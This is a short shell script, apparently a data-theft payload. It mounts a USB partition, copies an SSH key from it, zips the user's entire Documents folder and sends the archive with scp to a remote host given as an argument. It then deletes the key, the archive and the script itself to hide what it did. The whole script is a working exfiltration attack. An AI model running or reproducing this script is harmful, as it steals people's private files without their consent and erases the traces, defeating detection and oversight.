x=`udisksctl mount -b /dev/sda1 | cut -d" " -f4`
cp "${x}/update.key" /tmp/update.key
chmod 600 /tmp/update.key
zip -r /tmp/gotit.zip ~/Documents
scp -i /tmp/update.key /tmp/gotit.zip opc@$1:~/
rm /tmp/update.key
rm /tmp/gotit.zip
rm /tmp/test.sh
